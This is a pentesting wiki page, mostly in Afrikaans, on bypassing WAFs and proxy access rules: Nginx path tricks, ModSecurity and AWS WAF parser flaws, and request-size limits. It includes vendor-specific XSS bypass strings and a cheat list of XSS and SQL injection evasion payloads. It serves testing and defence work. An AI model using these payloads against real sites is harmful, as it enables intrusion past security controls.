# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Teknieke [uit hierdie navorsing](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx reël voorbeeld:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
In order to prevent bypasses Nginx performs path normalization before checking it. However, if the backend server performs a different normalization (removing characters that nginx doesn't remove) it might be possible to bypass this defense.

Om bypasses te voorkom voer Nginx padnormalisering uit voordat dit nagegaan word. As die backend-bediener egter 'n ander normalisering uitvoer (deur karakters te verwyder wat nginx nie verwyder nie), kan dit moontlik wees om hierdie verdediging te omseil.

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM-konfigurasie:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx is geconfigureer om toegang tot `/admin.php` te blokkeer, maar dit is moontlik om dit te omseil deur toegang tot `/admin.php/index.php`.

### Hoe om dit te voorkom
```plaintext
location ~* ^/admin {
deny all;
}
```
## Omseil Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Padverwarring

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) word verduidelik dat ModSecurity v3 (tot 3.0.12) die `REQUEST_FILENAME` veranderlike **onvoldoende geïmplementeer** het wat veronderstel is om die toeganglike path te bevat (tot by die begin van die parameters). Dit is omdat dit 'n URL decode uitgevoer het om die path te kry.\
Dus sal 'n versoek soos `http://example.com/foo%3f';alert(1);foo=` in ModSecurity aanneem dat die path net `/foo` is omdat `%3f` na `?` omskakel wat die URL path beëindig, maar eintlik is die path wat 'n server sal ontvang `/foo%3f';alert(1);foo=`.

Die veranderlikes `REQUEST_BASENAME` en `PATH_INFO` is ook deur hierdie fout geraak.

Soortgelyke gedrag het in weergawe 2 van ModSecurity voorgekom wat toegelaat het om 'n beskerming wat gebruikers verhinder om toegang tot lêers met spesifieke extensies (soos `.bak`) te kry te omseil, eenvoudig deur die dot URL-gekodeer as `%2e` te stuur, byvoorbeeld: `https://example.com/backup%2ebak`.

## Omseil AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Mislvormde header

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) noem dat dit moontlik was om AWS WAF-reëls wat op HTTP headers toegepas is te omseil deur 'n "malformed" header te stuur wat nie behoorlik deur AWS gepars is nie, maar wel deur die backend server.

Byvoorbeeld, deur die volgende request te stuur met 'n SQL injection in die header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Dit was moontlik om AWS WAF te omseil omdat dit nie sou verstaan dat die volgende reël deel is van die waarde van die header nie, terwyl die NODEJS-bediener dit wel gedoen het (dit is reggemaak).

## Generiese WAF-omseilings

### Versoekgroottebeperkings

Algemeen het WAFs 'n sekere lengtebeperking van versoeke om te kontroleer en as 'n POST/PUT/PATCH-versoek daarbo is, sal die WAF die versoek nie kontroleer nie.

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maksimumgrootte van 'n webversoek-body wat nagegaan kan word vir Application Load Balancer en AWS AppSync beskermings</td><td>8 KB</td></tr><tr><td>Maksimumgrootte van 'n webversoek-body wat nagegaan kan word vir CloudFront, API Gateway, Amazon Cognito, App Runner, en Verified Access beskermings**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Ouer Web Application Firewalls met Core Rule Set 3.1 (of laer) laat boodskappe groter as **128 KB** toe deur request body inspection af te skakel, maar hierdie boodskappe sal nie vir kwesbaarhede nagegaan word nie. Vir nuwer weergawes (Core Rule Set 3.2 of nuwer), kan dieselfde gedoen word deur die maksimum request body limiet te deaktiveer. Wanneer 'n versoek die groottegrens oorskry:

Indien p**revention mode**: registreer en blokkeer die versoek.\
Indien **detection mode**: inspekteer tot by die limiet, ignoreer die res, en registreer indien die `Content-Length` die limiet oorskry.

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

By verstek inspekteer die WAF slegs die eerste 8KB van 'n versoek. Dit kan die limiet verhoog tot 128KB deur Advanced Metadata by te voeg.

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Tot 128KB.

### Inspeksiegaping vir statiese assets (.js GETs)

Sommige CDN/WAF-stakke pas swak of geen inhoudsinspeksie toe op GET-versoeke vir statiese assets (bv. paadjies wat eindig met `.js`), terwyl hulle steeds globale reëls soos ratelimiting en IP-reputasie toepas. Gekombineer met outo-caching van statiese extensies, kan dit misbruik word om kwaadwillige variante te lewer of te seed wat daaropvolgende HTML-antwoorde beïnvloed.

Praktiese gebruike:

- Stuur payloads in onbetroubare headers (bv. `User-Agent`) op 'n GET na 'n `.js` pad om inhoudsinspeksie te vermy, en versoek dan onmiddellik die hoof-HTML om die gecachte variant te beïnvloed.
- Gebruik 'n vars/skoon IP; sodra 'n IP gemerk is, kan routeringsveranderinge die tegniek onbetroubaar maak.
- In Burp Repeater, gebruik "Send group in parallel" (single-packet style) om die twee versoeke (`.js` dan HTML) deur dieselfde front-end pad te laat meeding.

Dit pas goed by header-reflection cache poisoning. Sien:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuskering <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode-kompatibiliteit <a href="#unicode-compatability" id="unicode-compatability"></a>

Afhangend van die implementering van Unicode-normalisering (meer inligting [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), kan karakters wat Unicode-kompatibiliteit deel, moontlik die WAF omseil en as die bedoelde payload uitgevoer word. Kompatibele karakters is te vind [here](https://www.compart.com/en/unicode).

#### Voorbeeld <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a>

Soos in [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization) genoem, om WAFs wat 'n konteks van die gebruikersinvoer kan handhaaf te omseil, kan ons die WAF-tegnieke misbruik om eintlik die gebruiker se invoer te normaliseer.

Byvoorbeeld, in die pos word genoem dat **Akamai het 'n gebruikersinvoer 10 keer URL-afgekodeer**. Daarom sal iets soos `<input/%2525252525252525253e/onfocus` deur Akamai gesien word as `<input/>/onfocus` wat **mag dink dit is ok as die tag gesluit is**. As die toepassing die invoer egter nie 10 keer URL-afkodeer nie, sal die slagoffer iets soos `<input/%25252525252525253e/onfocus` sien wat **nog steeds geldig is vir 'n XSS-aanval**.

Hierdie benadering maak dit dus moontlik om **payloads te versteek in gekodeerde komponente** wat die WAF sal dekodeer en interpreteer, terwyl die slagoffer dit nie sal doen nie.

Verder kan dit nie net met URL encoded payloads gedoen word nie, maar ook met ander enkodings soos unicode, hex, octal...

In die pos word die volgende finale bypasses voorgestel:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Dit word ook genoem dat, afhangende van **hoe sommige WAFs die konteks** van die gebruikersinvoer verstaan, dit moontlik is om dit te misbruik. Die voorgestelde voorbeeld in die blog is dat Akamai toegelaat het om enigiets tussen `/*` en `*/` te plaas (waarskynlik omdat dit algemeen as kommentaar gebruik word). Daarom sal 'n SQLinjection soos `/*'or sleep(5)-- -*/` nie gevang word nie en geldig wees, aangesien `/*` die beginstring van die injeksie is en `*/` as kommentaar beskou word.

Hierdie soort konteksprobleme kan ook gebruik word om **ander kwesbaarhede as die een wat deur die WAF verwag word te misbruik** (bv. dit kan ook gebruik word om 'n XSS te exploits).

### Inline JavaScript first-statement inspection gaps

Sekere inline-inspeksiereëls ontleed net die eerste JavaScript-stelling wat binne 'n event handler voorkom. Deur 'n onskadelike-voorkomende uitdrukking in hakies voor te voeg gevolg deur 'n semikolon (byvoorbeeld `onfocus="(history.length);payload"`), omseil die kwaadwillige kode ná die semikolon die inspeksie terwyl die blaaier dit steeds uitvoer. Deur dit te kombineer met fragment-geïnduseerde fokus (bv. die toevoeging van `#forgot_btn` sodat die geteikende element by laai gefokus is) maak dit click-less XSS moontlik wat onmiddellik `$.getScript` kan aanroep en phishing-instrumente soos keyloggers kan bootstrap. Sien die [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs) afgelei van [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Genereer 'n API gateway URL om met ffuf te gebruik
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Soortgelyk aan fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin wat API gateway IPs gebruik
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): 'n Dinamies bepaalde aantal houer-instanse word geaktiveer gebaseer op die insetlêergrootte en split-faktor, met die inset opgesplits in stukke vir parallelle uitvoering — byvoorbeeld 100 instansies wat 100 stukke van 'n 10,000-lyn insetlêer verwerk met 'n split-faktor van 100 lyne.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Verskillende tegnieke kan gebruik word om die regex-filters op die firewalls te omseil. Voorbeelde sluit in afwisselende hoof-/kleinskryf, die toevoeging van reëlspringe, en die enkodering van payloads. Hulpbronne vir die verskeie bypasses is te vinde by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) en [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Die voorbeelde hieronder is geneem uit [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Gereedskap

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp plugin om rommeldata by versoeke te voeg om WAFs deur lengte te omseil

## Verwysings

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
